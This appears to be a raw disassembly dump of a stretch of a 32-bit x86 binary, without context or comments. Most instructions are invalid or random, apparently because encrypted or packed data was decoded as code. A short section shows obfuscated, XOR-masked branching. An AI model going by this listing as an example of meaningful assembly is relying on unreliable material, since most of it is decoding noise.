  405a1b:	(bad)  
  405a1c:	loopne 0x4059ee
  405a1e:	push   eax
  405a1f:	jl     0x405a5a
  405a21:	stos   BYTE PTR es:[edi],al
  405a22:	outs   dx,DWORD PTR ds:[esi]
  405a23:	imul   edx,DWORD PTR [edi+0x46],0xe
  405a27:	cmp    al,0x91
  405a29:	ret    
  405a2a:	je     0x405a94
  405a2c:	ret    
  405a2d:	push   ecx
  405a2e:	retf   0x9559
  405a31:	mov    dh,BYTE PTR [edi+edi*8-0x16]
  405a35:	lods   eax,DWORD PTR ds:[esi]
  405a36:	mov    ecx,0x42ea723f
  405a3b:	icebp  
  405a3c:	mov    ecx,esp
  405a3e:	pushf  
  405a3f:	sub    eax,0x7eb8941d
  405a44:	gs or  ebp,0xffffff89
  405a48:	in     al,0x37
  405a4a:	pop    ss
  405a4b:	xor    eax,0x18ca31db
  405a50:	in     eax,dx
  405a51:	adc    dh,bl
  405a53:	fdivr  QWORD PTR [ecx-0x3d]
  405a56:	push   ebx
  405a57:	test   al,0x74
  405a59:	das    
  405a5a:	add    DWORD PTR [ecx+ecx*2],eax
  405a5d:	cmp    al,0x28
  405a5f:	adc    BYTE PTR [ecx-0xf],al
  405a62:	jae    0x405a63
  405a64:	cmp    al,0xfc
  405a66:	jo     0x405ad5
  405a68:	and    edi,DWORD PTR [ebx-0x65]
  405a6b:	cwde   
  405a6c:	leave  
  405a6d:	lods   eax,DWORD PTR ds:[esi]
  405a6e:	(bad)  
  405a6f:	sar    BYTE PTR ds:0xb310c9c5,1
  405a75:	les    ebx,FWORD PTR [ebx]
  405a77:	pop    esi
  405a78:	lods   al,BYTE PTR ds:[esi]
  405a79:	jg     0x405a50
  405a7b:	pop    es
  405a7c:	xor    ah,ch
  405a7e:	cmp    DWORD PTR ds:0x3b0810e5,0xd59cfd5b
  405a88:	into   
  405a89:	mov    ebx,0x1b2a69c1
  405a8e:	adc    dl,BYTE PTR [eax-0x74]
  405a91:	lea    ecx,[ebx+0x4d6dd70d]
  405a97:	pop    ecx
  405a98:	jno    0x405add
  405a9a:	rcl    DWORD PTR [esi+0x6055505a],cl
  405aa0:	mov    bl,0xc2
  405aa2:	adc    dl,bh
  405aa4:	add    eax,0x8383c023
  405aa9:	pop    edi
  405aaa:	dec    esi
  405aab:	dec    ebp
  405aac:	hlt    
  405aad:	fiadd  DWORD PTR [ebx-0x2f270ba5]
  405ab3:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ab5:	add    al,0xf4
  405ab7:	mov    WORD PTR [edx+edx*2],?
  405aba:	jle    0x405a6c
  405abc:	xchg   edx,eax
  405abd:	cmp    al,0xb
  405abf:	xor    al,0x78
  405ac1:	stos   BYTE PTR es:[edi],al
  405ac2:	call   0x8f908d7
  405ac7:	ins    BYTE PTR es:[edi],dx
  405ac8:	xlat   BYTE PTR ds:[ebx]
  405ac9:	xchg   ebp,eax
  405aca:	sub    bh,BYTE PTR [ecx-0x53]
  405acd:	stos   BYTE PTR es:[edi],al
  405ace:	ins    BYTE PTR es:[edi],dx
  405acf:	sbb    eax,DWORD PTR [esp+edx*1-0x58c503ea]
  405ad6:	lahf   
  405ad7:	mov    edx,0x96903fcf
  405adc:	cmp    bh,BYTE PTR [esi]
  405ade:	lods   al,BYTE PTR ds:[esi]
  405adf:	nop
  405ae0:	push   ecx
  405ae1:	xor    edx,DWORD PTR [eax+ebp*4-0x713c4526]
  405ae8:	fsub   st(7),st
  405aea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405aeb:	mov    edi,0x8ebb9b21
  405af0:	mov    bl,0xce
  405af2:	(bad)  [ebp-0x24f8d4e]
  405af8:	sbb    bh,BYTE PTR [edi]
  405afa:	aad    0x6d
  405afc:	jge    0x405ae3
  405afe:	aam    0x12
  405b00:	sbb    DWORD PTR [ebp+0x4e2b29a9],edi
  405b06:	cs pop ds
  405b08:	sahf   
  405b09:	mov    ebx,0xece435ce
  405b0e:	xchg   edx,eax
  405b0f:	mov    ebx,0x5dbd5484
  405b14:	hlt    
  405b15:	sbb    al,0x86
  405b17:	push   edx
  405b18:	sub    al,0x49
  405b1a:	imul   DWORD PTR [esi-0x6aafdc7c]
  405b20:	int    0xab
  405b22:	lods   eax,DWORD PTR ds:[esi]
  405b23:	jle    0x405ac5
  405b25:	aam    0xe4
  405b27:	cmc    
  405b28:	push   cs
  405b29:	aam    0x36
  405b2b:	mov    bl,0x74
  405b2d:	aas    
  405b2e:	ror    ecx,0x39
  405b31:	cmp    cl,BYTE PTR [ecx+0x6db9104d]
  405b37:	or     al,0x0
  405b39:	add    bh,al
  405b3b:	inc    ebp
  405b3c:	or     BYTE PTR [ebp-0x38f0cb32],bh
  405b42:	inc    ebp
  405b43:	cld    
  405b44:	test   DWORD PTR ds:[eax+edi*8-0x637acd47],ebx
  405b4c:	clc    
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43379b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433753,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4337a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4337ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43382f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x2f92cb5
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405b8a
  405be0:	inc    esp
  405be1:	outs   dx,DWORD PTR gs:[esi]
  405be3:	fst    QWORD PTR [edi+0xa2480b7]
  405be9:	xor    al,0xd2
  405beb:	and    eax,0xa492bbd0
  405bf0:	in     eax,0x82
  405bf2:	jbe    0x405c35
  405bf4:	xor    al,dl
  405bf6:	repnz fld TBYTE PTR [edx+0x15]
  405bfa:	mov    dl,BYTE PTR [edx+0x52]
  405bfd:	pop    esp
  405bfe:	and    bh,BYTE PTR [eax]
  405c00:	pop    eax
  405c01:	(bad)  
  405c02:	outs   dx,BYTE PTR ds:[esi]
  405c03:	push   0xa12ca45d
  405c08:	pop    esp
  405c09:	gs in  eax,0x16
  405c0c:	data16 mov dl,0x4b
  405c0f:	and    DWORD PTR [edx],0x7c200ae2
  405c15:	pop    ds
  405c16:	push   esi
  405c17:	shr    BYTE PTR [esi+0xb2a4f8f],0x1d
  405c1e:	je     0x405bfd
  405c20:	sar    BYTE PTR [ecx-0x1f570c6a],cl
  405c26:	and    eax,0x146de3ed
  405c2b:	out    dx,eax
  405c2c:	and    DWORD PTR [edx+0x2fcb730c],edi
  405c32:	mov    bl,0x48
  405c34:	inc    edi
  405c35:	fcomp  DWORD PTR [ebp-0x4]
  405c38:	cmp    esp,0xc
  405c3b:	shl    DWORD PTR [edi-0x31],1
  405c3e:	daa    
  405c3f:	test   al,0x8d
  405c41:	js     0x405c85
  405c43:	lock pop edx
  405c45:	sbb    eax,0xf2a12cd6
  405c4a:	out    dx,eax
  405c4b:	xor    edi,DWORD PTR [esi+0xd2e67f0]
  405c51:	push   ds
  405c52:	mov    esp,0x8b042782
  405c57:	jne    0x405c5d
  405c59:	les    edx,FWORD PTR [esi+0x12]
  405c5c:	dec    ecx
  405c5d:	pushf  
  405c5e:	data16 and ch,BYTE PTR [ebp+eiz*8-0x13]
  405c63:	test   al,0xfe
  405c65:	adc    DWORD PTR [edx],ecx
  405c67:	aam    0x2b
  405c69:	pop    esi
  405c6a:	and    eax,0x37702dcb
  405c6f:	jecxz  0x405cb2
  405c71:	sbb    esp,DWORD PTR [edi-0x61]
  405c74:	jae    0x405c3e
  405c76:	loope  0x405cd5
  405c78:	cld    
  405c79:	xor    BYTE PTR [edx-0x77],ah
  405c7c:	adc    BYTE PTR [edi],ah
  405c7e:	aas    
  405c7f:	dec    edx
  405c80:	stos   DWORD PTR es:[edi],eax
  405c81:	icebp  
  405c82:	dec    edi
  405c83:	data16 jecxz 0x405c0b
  405c86:	mov    ebx,0x9da73974
  405c8b:	or     BYTE PTR [esi+edx*4],bl
  405c8e:	ror    DWORD PTR [eax+0x74],0x30
  405c92:	jmp    0x405d0f
  405c94:	sub    ebp,ecx
  405c96:	stos   BYTE PTR es:[edi],al
  405c97:	push   0xe251d9d0
  405c9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c9d:	dec    edx
  405c9e:	push   esp
  405c9f:	aad    0xe7
  405ca1:	daa    
  405ca2:	ret    
  405ca3:	add    edi,eax
  405ca5:	leave  
  405ca6:	les    esi,FWORD PTR [edi]
  405ca8:	or     al,0x7c
  405caa:	fwait
  405cab:	add    eax,0x5d767e37
  405cb0:	pop    ecx
  405cb1:	pop    ebp
  405cb2:	(bad)  
  405cb3:	mov    ecx,0x484bfd83
  405cb8:	popa   
  405cb9:	jmp    0x405c7d
  405cbb:	sbb    ebx,0x2d91d10
  405cc1:	lea    ebp,[edi]
  405cc3:	xchg   ecx,eax
  405cc4:	jo     0x405cd4
  405cc6:	ds out 0x71,eax
  405cc9:	ja     0x405c9e
  405ccb:	or     DWORD PTR [esi+0x49eae2b9],esi
  405cd1:	pop    ebx
  405cd2:	cwde   
  405cd3:	(bad)
  405cd6:	out    0xa5,al
  405cd8:	mov    esi,esi
  405cda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cdb:	jle    0x405d3d
  405cdd:	xchg   ebp,eax
  405cde:	hlt    
  405cdf:	jns    0x405caa
  405ce1:	mov    ebp,0x24ad228c
  405ce6:	jl     0x405c9a
  405ce8:	sar    BYTE PTR [ebp+0xe39b4f8],cl
  405cee:	cwde   
  405cef:	test   BYTE PTR [ecx],dh
  405cf1:	scas   eax,DWORD PTR es:[edi]
  405cf2:	mov    al,ds:0x2aac4a70
  405cf7:	sub    BYTE PTR [ebx+0x2],dh
  405cfa:	shl    BYTE PTR [ebx],cl
  405cfc:	push   es
  405cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cfe:	(bad)  
  405cff:	cmp    al,0x59
  405d01:	or     eax,0x4f20ae00
  405d06:	in     eax,dx
  405d07:	add    ch,0xdd
  405d0a:	or     al,0xd6
  405d0c:	add    DWORD PTR [edx+0x66259fd7],esi
  405d12:	loope  0x405d60
  405d14:	pop    ss
  405d15:	sbb    eax,0xfda2c5e8
  405d1a:	mov    cl,0x29
  405d1c:	ret    0x7394
  405d1f:	retf   
  405d20:	lods   eax,DWORD PTR ds:[esi]
  405d21:	push   esi
  405d22:	push   ebp
  405d23:	stos   DWORD PTR es:[edi],eax
  405d24:	loopne 0x405d6b
  405d26:	cmp    eax,0xdbd2d0a5
  405d2b:	sub    eax,0x203052bf
  405d30:	mov    eax,ds:0xef9eac21
  405d35:	jno    0x405ced
  405d37:	fmul   DWORD PTR [edx]
  405d39:	enter  0x54ef,0x2f
  405d3d:	add    BYTE PTR ds:[esp+eiz*4-0x52],cl
  405d42:	mov    al,ds:0x49804d23
  405d47:	js     0x405d15
  405d49:	mov    cl,0x5f
  405d4b:	push   edx
  405d4c:	add    esi,DWORD PTR [ebp-0x3b]
  405d4f:	and    ebp,DWORD PTR [ebx]
  405d51:	mov    al,0xef
  405d53:	inc    eax
  405d54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d55:	imul   esp,ebx,0xd87c06a3
  405d5b:	cwde   
  405d5c:	jbe    0x405d47
  405d5e:	jo     0x405dc0
  405d60:	(bad)  
  405d61:	fdiv   QWORD PTR [edx]
  405d63:	cmp    eax,0xa59ddd0d
  405d68:	jns    0x405d4b
  405d6a:	mov    ah,0x48
  405d6c:	mov    edx,?
  405d6e:	dec    edx
  405d6f:	mov    ecx,esp
  405d71:	into   
  405d72:	or     edx,ebx
  405d74:	push   0x5d3d82c1
  405d79:	imul   ecx,edx,0xfffffff8
  405d7c:	add    BYTE PTR [eax],dh
  405d7e:	adc    dh,cl
  405d80:	cmc    
  405d81:	scas   eax,DWORD PTR es:[edi]
  405d82:	sti    
  405d83:	sub    dl,ch
  405d85:	shr    DWORD PTR [edi],1
  405d87:	xchg   esp,eax
  405d88:	mov    edx,0x8096667b
  405d8d:	or     edx,DWORD PTR [esi]
  405d8f:	jmp    0x602d:0x46be390e
  405d96:	sbb    eax,0x55f4e6a7
  405d9b:	enter  0xa6c0,0x76
  405d9f:	inc    edi
  405da0:	stc    
  405da1:	sub    ah,BYTE PTR [edi]
  405da3:	mov    BYTE PTR [esi+ebx*2+0x3d98661d],ch
  405daa:	icebp  
  405dab:	cmp    edi,ecx
  405dad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dae:	jp     0x405e0d
  405db0:	mov    ds:0xcb2a4979,al
  405db5:	lods   al,BYTE PTR ds:[esi]
  405db6:	cmp    cl,cl
  405db8:	lods   eax,DWORD PTR ds:[esi]
  405db9:	fsubr  DWORD PTR [ebp-0x6c60735b]
  405dbf:	dec    eax
  405dc0:	test   eax,0x3b85403a
  405dc5:	dec    DWORD PTR [ecx]
  405dc7:	jne    0x405e3c
  405dc9:	or     ebp,ecx
  405dcb:	loopne 0x405d84
  405dcd:	mov    dh,0x5d
  405dcf:	stos   DWORD PTR es:[edi],eax
  405dd0:	push   ebp
  405dd1:	lods   al,BYTE PTR ds:[esi]
  405dd2:	jno    0x405e0d
  405dd4:	jbe    0x405d85
  405dd6:	pop    ds
  405dd7:	mov    ch,0x37
  405dd9:	sbb    eax,0xfe9b8445
  405dde:	shl    DWORD PTR [edx-0x6a8cd63e],0x9c
  405de5:	push   edx
  405de6:	xchg   ecx,eax
  405de7:	ja     0x405de1
  405de9:	test   al,0x38
  405deb:	(bad)  
  405dec:	jl     0x405da4
  405dee:	jl     0x405da5
  405df0:	fld    st(5)
  405df2:	stos   DWORD PTR es:[edi],eax
  405df3:	inc    esi
  405df4:	push   edx
  405df5:	sbb    eax,0xdbff69b0
  405dfa:	pop    edi
  405dfb:	out    dx,al
  405dfc:	dec    edi
  405dfd:	xchg   edx,eax
  405dfe:	xchg   ecx,eax
  405dff:	daa    
  405e00:	sbb    al,0x32
  405e02:	cs aam 0xa3
  405e05:	std    
  405e06:	inc    eax
  405e07:	mov    ecx,0xc3938795
  405e0c:	jmp    0x687dc692
  405e11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e12:	std    
  405e13:	cld    
  405e14:	mov    dl,0xe4
  405e16:	retf   0xa9e
  405e19:	push   esp
  405e1a:	cmp    eax,0xb1acd1c9
  405e1f:	inc    edi
  405e20:	mov    ecx,0x2f95c158
  405e25:	test   BYTE PTR ds:0xbac1269c,dl
  405e2b:	inc    edx
  405e2c:	loopne 0x405e2c
  405e2e:	mov    BYTE PTR [ebx+0x6c],ch
  405e31:	scas   al,BYTE PTR es:[edi]
  405e32:	fnstenv [ebx]
  405e34:	iret   
  405e35:	mov    cl,0xa1
  405e37:	cmp    ecx,DWORD PTR [ecx]
  405e39:	js     0x405e5f
  405e3b:	add    BYTE PTR [edx-0x1d],dl
  405e3e:	das    
  405e3f:	test   DWORD PTR [esi+0x43ba6122],ebx
  405e45:	mov    ecx,0x36e144d
  405e4a:	jns    0x405e14
  405e4c:	dec    ecx
  405e4d:	mov    ds:0xff485b9b,al
  405e52:	aam    0xe1
  405e54:	leave  
  405e55:	scas   eax,DWORD PTR es:[edi]
  405e56:	adc    dh,cl
  405e58:	inc    ebp
  405e59:	add    DWORD PTR [ebp+0x2],esp
  405e5c:	cli    
  405e5d:	les    ebx,FWORD PTR [ebx]
  405e5f:	push   ecx
  405e60:	mov    BYTE PTR [eax],0x80
  405e63:	dec    esp
  405e64:	mov    edi,0xaf575041
  405e69:	mov    esp,DWORD PTR [ecx+0x6d]
  405e6c:	sbb    DWORD PTR [esi-0xb],ebp
  405e6f:	adc    BYTE PTR [ebp+0x2e],bh
  405e72:	in     eax,0x5f
  405e74:	int    0xfa
  405e76:	dec    eax
  405e77:	test   BYTE PTR [eax],bh
  405e79:	mov    cl,0x64
  405e7b:	and    al,0xa8
  405e7d:	mov    dl,0xd0
  405e7f:	(bad)  
  405e80:	hlt    
  405e81:	and    edx,DWORD PTR [edx+0x58]
  405e84:	test   eax,0x3d6ddfae
  405e89:	ret    0x6902
  405e8c:	pop    ds
  405e8d:	xchg   esi,ecx
  405e8f:	adc    BYTE PTR [ebp+0x7e],cl
  405e92:	xchg   ebp,eax
  405e93:	or     DWORD PTR ds:0xe7703a86,edx
  405e99:	(bad)  
  405e9a:	out    0xce,al
  405e9c:	ja     0x405f0d
  405e9e:	ret    0xfc72
  405ea1:	cmp    al,0x1e
  405ea3:	mov    dh,0x65
  405ea5:	adc    DWORD PTR [ecx+0xe],0x76865c56
  405eac:	out    0x72,eax
  405eae:	data16 (bad) [bx+di]
  405eb2:	ret    0x1924
  405eb5:	fsub   DWORD PTR [edx+0x7]
  405eb8:	out    dx,eax
  405eb9:	push   0xfe419a00
  405ebe:	or     edi,DWORD PTR [ebx]
  405ec0:	bound  edi,QWORD PTR [esi]
  405ec2:	pusha  
  405ec3:	and    BYTE PTR [ebp-0x7b],0xf2
  405ec7:	mov    al,cl
  405ec9:	(bad)  
  405eca:	leave  
  405ecb:	add    BYTE PTR [eax],al
  405ecd:	fstp   DWORD PTR [ebp-0x1eec0bc5]
  405ed3:	scas   al,BYTE PTR es:[edi]
  405ed4:	out    0xf,eax
  405ed6:	(bad)  
  405ed7:	fisttp DWORD PTR [ebp+0x1b]
  405eda:	xor    eax,0x3292b297
  405edf:	fs (bad) 
  405ee1:	push   0x21
  405ee3:	mov    esi,0x708b26bf
  405ee8:	rcl    DWORD PTR [ebx-0x71],1
  405eeb:	jg     0x405e9f
  405eed:	pop    ds
  405eee:	leave  
  405eef:	jb     0x405ec3
  405ef1:	inc    edi
  405ef2:	test   bl,0x8e
  405ef5:	xchg   edi,eax
  405ef6:	jae    0x405ee4
  405ef8:	fisub  WORD PTR [ecx-0x38ecbec0]
  405efe:	(bad)  
  405eff:	in     al,0x8
  405f01:	adc    BYTE PTR [edx+ebp*1-0x4d],cl
  405f05:	add    BYTE PTR [eax],0x52
  405f08:	fst    DWORD PTR [eax-0x7da6535f]
  405f0e:	sub    ebp,edx
  405f10:	nop
  405f11:	xor    esi,ecx
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    ecx,ds
  405f27:	push   ebp
  405f28:	retf   0xa69a
  405f2b:	xor    BYTE PTR [esi+0x7e],bh
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	clc    
  405f33:	pop    edi
  405f34:	sub    eax,0x22a4544b
  405f39:	enter  0x2120,0xb2
  405f3d:	call   0xe9e8:0x72774dcf
  405f44:	mov    al,0xe0
  405f46:	imul   esp,DWORD PTR [ecx+eiz*1-0x41f240e6],0xdb456b68
  405f51:	loopne 0x405f18
  405f53:	jne    0x405f43
  405f55:	jle    0x405f3b
  405f57:	xchg   ebx,eax
  405f58:	out    0x60,eax
  405f5a:	and    bl,ch
  405f5c:	xchg   esi,eax
  405f5d:	shl    DWORD PTR [edx+0x188c2c7b],cl
  405f63:	rol    DWORD PTR [esi+0x72],0xa3
  405f67:	push   ss
  405f68:	mov    edx,?
  405f6a:	mov    esp,0xeff128ac
  405f6f:	out    dx,eax
  405f70:	stos   BYTE PTR es:[edi],al
  405f71:	push   edi
  405f72:	push   ds
  405f73:	rcl    BYTE PTR [ecx+0x57],cl
  405f76:	stc    
  405f77:	adc    BYTE PTR [eax+0x74],0xaf
  405f7b:	mov    edx,0x20d1056c
  405f80:	ja     0x405f47
  405f82:	pop    esi
  405f83:	or     eax,0x156d9a4b
  405f88:	dec    ebp
  405f89:	mov    edx,0x697fa993
  405f8e:	or     ah,bl
  405f90:	dec    esp
  405f91:	push   es
  405f92:	sti    
  405f93:	push   ecx
  405f94:	out    0x17,al
  405f96:	jmp    0x405f5c
  405f98:	mov    ecx,0xbf8cfa9a
  405f9d:	pusha  
  405f9e:	inc    esp
  405f9f:	lods   eax,DWORD PTR ds:[esi]
  405fa0:	stos   BYTE PTR es:[edi],al
  405fa1:	(bad)  
  405fa2:	lahf   
  405fa3:	mov    dl,0xe2
  405fa5:	ror    BYTE PTR [esi],cl
  405fa7:	xchg   edx,eax
  405fa8:	and    BYTE PTR [ebx-0x6edfe18b],0x33
  405faf:	or     eax,0xd4ec9a65
  405fb4:	lds    ebp,FWORD PTR [edx-0x2624b8c3]
  405fba:	aas    
  405fbb:	push   ebx
  405fbc:	xlat   BYTE PTR ds:[ebx]
  405fbd:	scas   al,BYTE PTR es:[edi]
  405fbe:	jnp    0x405fa5
  405fc0:	ficomp WORD PTR [edi+0x78ecb6ea]
  405fc6:	(bad)  
  405fc8:	cli    
  405fc9:	fxch   st(2)
  405fcb:	inc    esi
  405fcc:	(bad)  
  405fcd:	fidivr WORD PTR [esi-0x5137fb3d]
  405fd3:	call   0xe92a:0x145cf2e5
  405fda:	scas   eax,DWORD PTR es:[edi]
  405fdb:	xor    DWORD PTR [ebx],edx
  405fdd:	mov    ebx,0x7e5eefac
  405fe2:	shr    BYTE PTR [ecx+0x2ca7d780],0x83
  405fe9:	cmp    esp,ebp
  405feb:	mov    cs,WORD PTR [esi-0x64cd294d]
  405ff1:	fisttp DWORD PTR [edi]
  405ff3:	pop    edx
  405ff4:	pop    edx
  405ff5:	cs into 
  405ff7:	mov    bh,0x82
  405ff9:	push   ecx
  405ffa:	sti    
  405ffb:	xor    edx,0xe001f273
  406001:	stc    
  406002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406003:	and    DWORD PTR [ecx-0x4bb1bd03],esp
  406009:	jmp    FWORD PTR [ebx+0x79]
  40600c:	mov    al,ds:0xaee3a8ae
  406011:	mov    bl,0x70
  406013:	dec    ebp
  406014:	jmp    0x40600e
  406016:	cmp    al,0xa9
  406018:	jb     0x405fec
  40601a:	jp     0x406056
  40601c:	inc    ebp
  40601d:	(bad)  
  40601e:	or     ecx,esi
  406020:	nop
  406021:	pop    ds
  406022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406023:	(bad)  
  406025:	xor    ecx,DWORD PTR [ecx-0x377dd8de]
  40602b:	fs std 
  40602d:	cmp    DWORD PTR [edi+ebx*1-0x79],edi
  406031:	loopne 0x406041
  406033:	mov    esp,esp
  406035:	bound  esp,QWORD PTR [esi]
  406037:	adc    DWORD PTR [ecx+0x46],eax
  40603a:	push   cs
  40603b:	jne    0x40604c
  40603d:	fisub  WORD PTR [edi-0x10c969f4]
  406043:	scas   al,BYTE PTR es:[edi]
  406044:	or     bl,bl
  406046:	mov    DWORD PTR [edi+0x415ff289],edx
  40604c:	ret    
  40604d:	stc    
  40604e:	aaa    
  40604f:	mov    bl,0xe2
  406051:	xor    esi,esp
  406053:	pop    ds
  406054:	mov    edx,0x2a506d3d
  406059:	xchg   eax,esp
  40605b:	bound  esp,QWORD PTR [ebx-0x71]
  40605e:	int    0x34
  406060:	sbb    eax,DWORD PTR [esi]
  406062:	nop
  406063:	jb     0x406007
  406065:	xor    cl,BYTE PTR [ecx+0x4930d412]
  40606b:	push   eax
  40606c:	(bad)  
  40606d:	mov    bl,0xc1
  40606f:	add    eax,0x506dd1fa
  406074:	dec    eax
  406075:	mov    edx,0xb170876c
  40607a:	int    0xf9
  40607c:	stc    
  40607d:	add    dh,BYTE PTR [esi]
  40607f:	xchg   esp,eax
  406080:	shl    DWORD PTR [ecx],cl
  406082:	xor    dl,0x8e
  406085:	(bad)  
  406086:	mov    cl,0x27
  406088:	or     dh,BYTE PTR [esi-0x34076c85]
  40608e:	stos   BYTE PTR es:[edi],al
  40608f:	addr16 mov ds:0xdc19,al
  406093:	mov    edi,0x63666618
  406098:	sub    bl,BYTE PTR [eax-0x24]
  40609b:	cdq    
  40609c:	pop    esi
  40609d:	cmc    
  40609e:	mov    esp,DWORD PTR [ecx-0x80]
  4060a1:	mov    DWORD PTR [ecx+0x1ffc36b5],ecx
  4060a7:	lahf   
  4060a8:	push   cs
  4060a9:	addr16 leave 
  4060ab:	loop   0x406121
  4060ad:	sahf   
  4060ae:	test   BYTE PTR [ecx+0x43a6ea2f],al
  4060b4:	aam    0xac
  4060b6:	add    dh,BYTE PTR [edi-0x1d]
  4060b9:	push   cs
  4060ba:	inc    ecx
  4060bb:	lods   eax,DWORD PTR ds:[esi]
  4060bc:	cmp    DWORD PTR [edi+0x17],edx
  4060bf:	lods   al,BYTE PTR ds:[esi]
  4060c0:	cmp    esp,DWORD PTR [ebx]
  4060c2:	pshufw mm0,QWORD PTR [ebx],0xe
  4060c6:	inc    ebp
  4060c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060c8:	out    dx,al
  4060c9:	cwde   
  4060ca:	or     BYTE PTR [esp+0x38],0xeb
  4060cf:	mov    al,0xd2
  4060d1:	mov    esp,0x6c222850
  4060d6:	push   esp
  4060d7:	mov    eax,0xe235fe46
  4060dc:	mov    edx,0x1eb4f6a8
  4060e1:	ret    
  4060e2:	inc    ecx
  4060e3:	(bad)  
  4060e4:	icebp  
  4060e5:	sub    BYTE PTR [eax-0x970617d],0x75
  4060ec:	dec    esp
  4060ed:	and    BYTE PTR [ebx-0x39],0x7d
  4060f1:	dec    ebp
  4060f2:	xchg   edx,eax
  4060f3:	add    BYTE PTR [edi-0x69],0xa
  4060f7:	pop    edi
  4060f8:	or     eax,0x9dbcfaf1
  4060fd:	in     eax,dx
  4060fe:	mov    ah,BYTE PTR [eax+0x32]
  406101:	fimul  DWORD PTR [ebx+0x34]
  406104:	sub    edx,DWORD PTR [edx]
  406106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406107:	lods   eax,DWORD PTR ds:[esi]
  406108:	pop    es
  406109:	dec    ecx
  40610a:	fistp  QWORD PTR [ebx+0x69700e5d]
  406110:	jg     0x4060a4
  406112:	xor    al,BYTE PTR [esi]
  406114:	data16 add ah,0x80
  406118:	fmul   DWORD PTR [eax+0x83fd637]
  40611e:	test   BYTE PTR [ecx],al
  406120:	push   0xffffff95
  406122:	add    al,0x14
  406124:	outs   dx,DWORD PTR ds:[esi]
  406125:	gs dec eax
  406127:	mov    edx,0x98d67ea1
  40612c:	call   0xcd63:0x69705299
  406133:	adc    DWORD PTR [edi-0x32],0x5077ff2e
  40613a:	mov    edi,0xacad9d1c
  40613f:	mov    gs,WORD PTR [ecx+eax*1]
  406142:	xor    DWORD PTR [edx+eax*8-0x6d],0x269b45ad
  40614a:	ret    0xea1d
  40614d:	pop    edx
  40614e:	dec    eax
  40614f:	and    ah,BYTE PTR [ebp-0x30]
  406152:	outs   dx,BYTE PTR ds:[esi]
  406153:	sbb    ch,BYTE PTR [esi-0x7b]
  406156:	sbb    cl,BYTE PTR [edi]
  406158:	test   BYTE PTR [edi+0x2f],0x1b
  40615c:	ficomp DWORD PTR [edi+edi*1+0x57]
  406160:	pop    DWORD PTR [ebx-0x52]
  406163:	aaa    
  406164:	mov    ah,0xa7
  406166:	pop    edx
  406167:	ds es mov ebx,0xd99ee9e3
  40616e:	mov    ebp,0x226c3d58
  406173:	mov    ds:0x251e246d,al
  406178:	jb     0x406192
  40617a:	mov    DWORD PTR [edx+0x7],0x6a81696c
  406181:	out    dx,eax
  406182:	cs mov ebx,0x97c18945
  406188:	lods   al,BYTE PTR ds:[esi]
  406189:	jae    0x4061e7
  40618b:	xchg   edi,eax
  40618c:	iret   
  40618d:	mov    bh,BYTE PTR [edx-0x5aeeb98e]
  406193:	ficom  WORD PTR [ecx+0xf0139f8]
  406199:	inc    ecx
  40619a:	mov    al,0x4c
  40619c:	pop    eax
  40619d:	enter  0xa0b9,0x7c
  4061a1:	and    ebx,DWORD PTR [ecx+0x5d]
  4061a4:	push   ss
  4061a5:	outs   dx,DWORD PTR ds:[esi]
  4061a6:	pop    ebx
  4061a7:	aam    0xf9
  4061a9:	mov    ebx,0x9b7b42cb
  4061ae:	mov    ah,0xdf
  4061b0:	pop    eax
  4061b1:	push   cs
  4061b2:	pop    edi
  4061b3:	mov    ds:0xf1047681,al
  4061b8:	and    eax,edx
  4061ba:	sub    eax,esp
  4061bc:	mov    bl,BYTE PTR [eax-0x58]
  4061bf:	push   ecx
  4061c0:	inc    eax
  4061c1:	neg    DWORD PTR [ecx-0x48]
  4061c4:	sbb    DWORD PTR [edi+ecx*8-0x56e8d3ea],ebp
  4061cb:	xor    DWORD PTR [esi+0xe],ecx
  4061ce:	inc    ebp
  4061cf:	push   eax
  4061d0:	cmp    esi,DWORD PTR [edx+0x14166bb9]
  4061d6:	outs   dx,BYTE PTR ds:[esi]
  4061d7:	dec    edx
  4061d8:	dec    ebp
  4061d9:	icebp  
  4061da:	xor    eax,0x167c0e7e
  4061df:	fisubr WORD PTR [edi+0x37]
  4061e2:	mov    ecx,0xdc1e789b
